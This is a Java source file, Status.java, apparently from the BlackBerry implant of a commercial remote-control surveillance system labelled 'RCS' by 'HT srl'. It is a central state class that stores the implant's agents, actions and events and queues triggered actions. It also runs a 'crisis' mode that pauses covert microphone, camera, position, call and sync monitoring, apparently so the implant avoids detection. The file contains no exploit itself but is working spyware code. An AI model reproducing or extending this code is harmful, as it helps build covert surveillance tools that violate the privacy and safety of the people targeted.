//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Status.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Date;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.util.IntHashtable;
import blackberry.action.Action;
import blackberry.agent.CrisisAgent;
import blackberry.agent.MicAgent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.evidence.Evidence;
import blackberry.interfaces.Singleton;
import blackberry.utils.BlockingQueueTrigger;

/**
 * The Class Status.
 */
public final class Status implements Singleton {

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("Status", DebugLevel.VERBOSE);
    //#endif

    public boolean applicationAgentFirstRun;

    /** The agents. */
    IntHashtable agents;

    /** The actions. */
    IntHashtable actions;

    /** The events. */
    IntHashtable events;

    /** The parameters. */
    IntHashtable parameters;

    /** The instance. */
    private static Status instance;

    private static final long GUID = 0xd41c0b0acdfc3d3eL;

    Object lockCrisis = new Object();
    //Object lockTriggerAction = new Object();

    Date startingDate;

    /**
     * Gets the single instance of Status.
     * http://www.blackberry.com/knowledgecenterpublic
     * /livelink.exe/fetch/2000/348583
     * /800332/832062/How_to_-_Create_a_singleton_using_the_RuntimeStore
     * .html?nodeid=1461424&vernum=0
     * 
     * @return single instance of Status
     */
    public static synchronized Status getInstance() {
        if (instance == null) {
            instance = (Status) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final Status singleton = new Status();

                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }

    // Debug debug=new Debug("Status");

    /** The crisis. */
    private boolean crisis = false;

    BlockingQueueTrigger triggeredActionsMain = new BlockingQueueTrigger();
    BlockingQueueTrigger triggeredActionsFast = new BlockingQueueTrigger();

    public boolean synced;
    public boolean gprs;
    public boolean wifi;

    /**
     * Instantiates a new status.
     */
    private Status() {
        startingDate = new Date();
    }




    /**
     * Clear.
     */
    public void clear() {
        //#ifdef DEBUG
        debug.trace("Clear");
        //#endif

        triggeredActionsFast.close();
        triggeredActionsMain.close();
        
        agents.clear();
        actions.clear();
        events.clear();
        parameters.clear();

    }


    private int crisisType;

    public int drift;

    public synchronized void setCrisis(int type) {

        synchronized (lockCrisis) {
            crisisType = type;
        }

        //#ifdef DEBUG
        debug.info("set crisis: " + type);
        //#endif

       
            final MicAgent micAgent = MicAgent.getInstance();
            micAgent.crisis(crisisMic());
        
    }

    public boolean callInAction() {
        final PhoneCall phoneCall = Phone.getActiveCall();
        return phoneCall != null
                && phoneCall.getStatus() != PhoneCall.STATUS_DISCONNECTED;
    }

    private boolean isCrisis() {
        //#ifdef DEMO
        if (crisis) {
            Debug.ledFlash(Debug.COLOR_ORANGE);
        }
        //#endif

        synchronized (lockCrisis) {
            return crisis;
        }
    }

    public boolean crisisPosition() {
        synchronized (lockCrisis) {
            return (isCrisis() && (crisisType & CrisisAgent.POSITION) != 0);
        }
    }

    public boolean crisisCamera() {
        synchronized (lockCrisis) {
            return (isCrisis() && (crisisType & CrisisAgent.CAMERA) != 0);
        }
    }

    public boolean crisisCall() {
        synchronized (lockCrisis) {
            return (isCrisis() && (crisisType & CrisisAgent.CALL) != 0);
        }
    }

    public boolean crisisMic() {
        synchronized (lockCrisis) {
            return (isCrisis() && (crisisType & CrisisAgent.MIC) != 0);
        }
    }

    public boolean crisisSync() {
        synchronized (lockCrisis) {
            return (isCrisis() && (crisisType & CrisisAgent.SYNC) != 0);
        }
    }

   
   
    /**
     * Start crisis.
     */
    public synchronized void startCrisis() {
        //#ifdef DEMO
        Debug.ledFlash(Debug.COLOR_ORANGE);
        //#endif
        crisis = true;
    }

    /**
     * Stop crisis.
     */
    public synchronized void stopCrisis() {
        crisis = false;
    }

    //Object triggeredSemaphore = new Object();

    /**
     * Gets the action id triggered.
     * 
     * @return the action id triggered
     */
    public Trigger getTriggeredActionFast() {
        return triggeredActionsFast.getTriggeredAction();
    }
    
    public Trigger getTriggeredActionMain() {
        return triggeredActionsMain.getTriggeredAction();
    }
    
    public BlockingQueueTrigger getTriggeredQueueFast() {
        return triggeredActionsFast;
    }
    
    public BlockingQueueTrigger getTriggeredQueueMain() {
        return triggeredActionsMain;
    }

 
    /**
     * Trigger action.
     * 
     * @param actionId
     *            the action id
     * @param event
     *            the event
     * @return true, if successful
     */
    public synchronized boolean triggerAction(final int actionId,
            final Event event) {
        //#ifdef DEBUG
        debug.trace("TriggerAction:" + actionId);
        //#endif

        if (actionId != Action.ACTION_NULL && actions.containsKey(actionId)) {
            final Action action = (Action) actions.get(actionId);
            action.trigger(event);
            return true;
        } else {
            //#ifdef DEBUG
            debug.error("TriggerAction FAILED " + actionId);
            //#endif
            return false;
        }
    }

    public synchronized void unTriggerAll() {
       triggeredActionsFast.unTriggerAll();
       triggeredActionsMain.unTriggerAll();
    }

    public Date getStartingDate() {
        return startingDate;
    }

    /**
     * test-and-set instruction is an instruction used to write to a memory
     * location and return its old value as a single atomic operation
     * 
     * @param newWifi
     * @return true se wifi ha cambiato di stato
     */
    public synchronized boolean testAndSetWifi(boolean newWifi) {
        boolean oldWifi = wifi;
        wifi = newWifi;
        return oldWifi;
    }

    /**
     * test-and-set instruction is an instruction used to write to a memory
     * location and return its old value as a single atomic operation
     * 
     * @param newWifi
     * @return true se wifi ha cambiato di stato
     */
    public synchronized boolean testAndSetGprs(boolean newGprs) {
        boolean oldGprs = gprs;
        gprs = newGprs;
        return oldGprs;
    }

    //#ifdef DEBUG

    int wap2Errors;
    int wap2Ok;

    public void wap2Error() {
        wap2Errors++;
        Evidence.info("Wap2 errors: " + wap2Errors + "/" + wap2Ok + " = "
                + wap2Errors * 100 / wap2Ok + "%");
    }

    public void wap2Ok() {
        wap2Ok++;
    }

    //#endif

    String currentForegroundAppName = "";

    public String getCurrentForegroundAppName() {
        return currentForegroundAppName;
    }

    String currentForegroundAppMod = "";

    public String getCurrentForegroundAppMod() {
        return currentForegroundAppMod;
    }

    public void setCurrentForegroundApp(String name, String mod) {
        currentForegroundAppName = name;
        currentForegroundAppMod = mod;

    }

    public static Status self() {
        return getInstance();
    }

}
